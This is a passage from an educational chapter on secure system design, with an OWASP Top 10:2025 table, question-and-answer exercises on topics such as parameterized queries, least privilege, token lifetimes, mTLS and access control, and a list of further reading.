| A02 | Security Misconfiguration | A system or cloud service set up insecurely, such as default passwords left unchanged, unneeded features turned on, or cloud permissions set wrongly. | [Least privilege](#putting-it-into-practice) |
| A03 | Software Supply Chain Failures | Compromises in dependencies, build systems or distribution. | Not covered here |
| A04 | Cryptographic Failures | Missing or weak encryption that exposes sensitive data. | [Encryption](#encrypt-data-in-transit-and-at-rest), [Storing passwords](#storing-passwords) |
| A05 | Injection | Untrusted input is run as code. This includes SQL injection and XSS. | [Untrusted input](#untrusted-input-and-common-web-attacks) |
| A06 | Insecure Design | Flaws in the design itself, which careful coding can't fix. | This whole chapter |
| A07 | Authentication Failures | Weaknesses in how users prove who they are. | [Authentication](#authentication-who-is-calling) |
| A08 | Software or Data Integrity Failures | Trusting code, updates or data without checking that they weren't changed. | Not covered here |
| A09 | Security Logging and Alerting Failures | Attacks go unnoticed because nothing is logged or nobody is alerted. | [Zero trust](#zero-trust) |
| A10 | Mishandling of Exceptional Conditions | Poor error handling, logic errors, and systems that "fail open" (allow access when something breaks). | Not covered here |

The 2025 [introduction](https://top10.owasp.org/2025/0x00_2025-Introduction/) explains what changed since 2021. Security Misconfiguration rose from fifth to second, Software Supply Chain Failures grew out of the older "Vulnerable and Outdated Components" category, and Mishandling of Exceptional Conditions is new. On logging it adds: "Great logging with no alerting is of minimal value in identifying security incidents."

## Check yourself

<details>
<summary>An interviewer asks how you'd secure a design, and security isn't your specialty. What are the basics to cover?</summary>

Four rules cover most of what is expected:

1. Encrypt data in transit with TLS, including traffic between internal services, and at rest, with keys held in a KMS.
2. Sanitize all user input: validate it on the server against an allowlist where you can, and escape it when you put it in a page, to prevent XSS and SQL injection.
3. Use parameterized queries for every database call, so input can never change a query's structure.
4. Apply the principle of least privilege, so each service and person has only the access its job needs.

If there is time, add authentication (short-lived tokens or server-side sessions), authorization checks on every request, and rate limiting at the API gateway.

</details>

<details>
<summary>Crumb's search code builds SQL by joining strings, but it also strips out quote characters first. Is that enough? What should it do instead?</summary>

No. Stripping quotes is a blocklist, and attackers look for the cases a blocklist misses: other encodings, numeric fields that need no quotes, or a different interpreter. It also breaks legitimate input, such as a recipe called "Grandma's soup".

Crumb should use a parameterized query. The query text has a placeholder such as `$1`, and the value is sent separately, so the database treats it only as data. If a user picks a column or sort order, Crumb should map their choice through an allowlist. As a second line of defense, the search code should connect as a database user that can only read the tables search needs.

</details>

<details>
<summary>What is the principle of least privilege? Give two examples from Crumb and say what each one protects against.</summary>

Every user, program and service should have only the permissions it needs to do its job. When one part is compromised, least privilege limits how much damage the attacker can do with it.

- The photo worker's credentials can read the uploads bucket and write only to the photos bucket. If a malicious image takes over a worker, the attacker can't reach the database, the backups or any other bucket.
- The weekly reporting job connects to a read replica as a read-only database user that can see only the columns it counts. If its password leaks, the attacker can't change or delete anything, and can't read email addresses or password hashes.

The Capital One breach shows the cost of skipping this: a firewall that only needed to filter traffic had permission to list and read every file in the company's storage buckets.

</details>

<details>
<summary>Why is it risky to use long-lived JWTs alone for user authentication, and what's the usual fix?</summary>

A JWT is checked by its signature and expiry alone, so it can't be revoked. If one is stolen, or you ban the account, it keeps working until it expires. If tokens last 7 days, that's a 7-day exposure. If they last 10 minutes and nothing else is in place, users have to log in every 10 minutes.

The usual fix pairs a short-lived access token (5 to 15 minutes) with a refresh token. The refresh token is stored on the server, kept in an `HttpOnly` cookie on the web, and often rotated on each use. Normal API calls stay free of lookups. Every few minutes, the refresh gives the authorization server a checkpoint where it can refuse a banned account or a revoked token. The worst case after a ban drops to one access-token lifetime.

</details>

<details>
<summary>What is the difference between OAuth 2.0 and OpenID Connect, and which token should an API accept?</summary>

OAuth 2.0 is for delegated authorization. It gives an application an access token, limited by scopes, to call an API on the user's behalf. It doesn't define how to learn who the user is. OpenID Connect adds authentication on top: an ID token, which is a signed JWT that tells the application who logged in (`sub`, `iss`, `aud`, `exp`).

An API should accept access tokens. It should check that the token is meant for it (the audience) and that it carries the scopes the request needs. ID tokens are meant only for the client application that requested them.

</details>

<details>
<summary>An attacker gets a copy of your database backup. How does envelope encryption protect the data, and what would they need to get anything out of it?</summary>

The backup holds only ciphertext and wrapped DEKs. The plaintext DEKs were never written to disk. To unwrap a DEK, you have to call the KMS, which holds the master key in its hardware and never releases it. The KMS allows the call only for identities its policy permits, and it logs every request.

So the attacker would also need credentials that let them call `Decrypt` on that key, for example by compromising the application's own cloud identity. That is still possible, which is why KMS permissions are kept narrow and its audit logs are watched. A stolen backup on its own is useless.

</details>

<details>
<summary>How does mutual TLS differ from ordinary TLS, and why is it used between internal services?</summary>

In ordinary TLS, only the server presents a certificate, and the client checks it. The client stays anonymous at this level and proves who it is later with a password, cookie or token. In mTLS, the server also asks for a client certificate. Both sides check the other's certificate against a trusted CA and prove they hold the matching private key. All of this happens in the TLS handshake, after the TCP connection is set up and before any HTTP data is sent. If either check fails, the connection is closed.

Between services, mTLS gives each call a verified caller identity that doesn't depend on IP addresses, and it encrypts internal traffic. Both are central to zero trust. A service mesh usually issues and rotates the certificates, so applications don't handle them.

</details>

<details>
<summary>When would you choose ABAC over RBAC, and what does the PEP/PDP split add?</summary>

RBAC is enough when permissions follow job function and don't depend on the specific resource or context, for example "support agents can view orders". Once rules depend on resource ownership, department, region, time or device, expressing them as roles leads to role explosion. ABAC states those rules directly, as policies over attributes of the subject, action, resource and environment.

The PEP/PDP split puts the policies in one engine (the PDP, such as OPA) that every enforcement point asks, whether it is a gateway, a sidecar or a service. Rules are written, tested and changed in one place instead of being copied into each service, and decisions stay consistent across the system.

</details>

## Further reading

- [OWASP Top 10:2025](https://top10.owasp.org/2025/): the current list of the most critical web application risks, with prevention advice and example attacks for each.
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/): short, practical guides to preventing specific problems. The [SQL injection](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html), [cross-site scripting](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) and [password storage](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html) sheets are the place to start. Its [Top Ten index](https://cheatsheetseries.owasp.org/IndexTopTen.html) maps each category of the 2021 Top 10 to the relevant sheets.
- [OWASP Top Ten Cheat Sheet (archived)](https://web.archive.org/web/20180824235345/https://www.owasp.org/index.php/OWASP_Top_Ten_Cheat_Sheet): an older one-page checklist of defenses for the 2013 Top 10, organized by presentation, controller and model layers. The page has since been retired, so treat it as background next to the current list.
- [API Security Checklist](https://github.com/shieldfy/API-Security-Checklist): a one-page checklist for designing, testing and releasing an API, covering authentication, rate limits, HTTPS and HSTS, input validation and security headers. Useful for reviewing a design before an interview or a launch.
- [A practical security guide for web developers](https://github.com/FallibleInc/security-guide-for-developers): an unfinished but readable guide aimed at developers new to security, with a checklist and chapters on HTTPS, input sanitizing and common attacks.
- [Principle of least privilege (Wikipedia)](https://en.wikipedia.org/wiki/Principle_of_least_privilege): where the idea comes from, with Saltzer's original wording and examples from operating systems.
- [What we can learn from the Capital One hack (KrebsOnSecurity)](https://krebsonsecurity.com/2019/08/what-we-can-learn-from-the-capital-one-hack/): a readable account of how SSRF and an over-privileged firewall combined to expose more than 100 million credit applications.
- [RFC 6749: The OAuth 2.0 Authorization Framework](https://www.rfc-editor.org/rfc/rfc6749): the core OAuth 2.0 specification.
- [RFC 9700: Best Current Practice for OAuth 2.0 Security](https://www.rfc-editor.org/rfc/rfc9700): today's guidance, including PKCE for public clients and dropping the implicit flow.
- [OpenID Connect Core 1.0](https://openid.net/specs/openid-connect-core-1_0.html): the ID token and the authentication flows built on OAuth 2.0.
- [RFC 8446: The Transport Layer Security (TLS) Protocol Version 1.3](https://www.rfc-editor.org/rfc/rfc8446): the handshake, forward secrecy, and the replay caveats of 0-RTT data.
- [AWS KMS concepts](https://docs.aws.amazon.com/kms/latest/developerguide/concepts.html): KMS keys, data keys and envelope encryption as one provider implements them.
- [NIST SP 800-207: Zero Trust Architecture](https://csrc.nist.gov/pubs/sp/800/207/final): the reference description of zero trust.
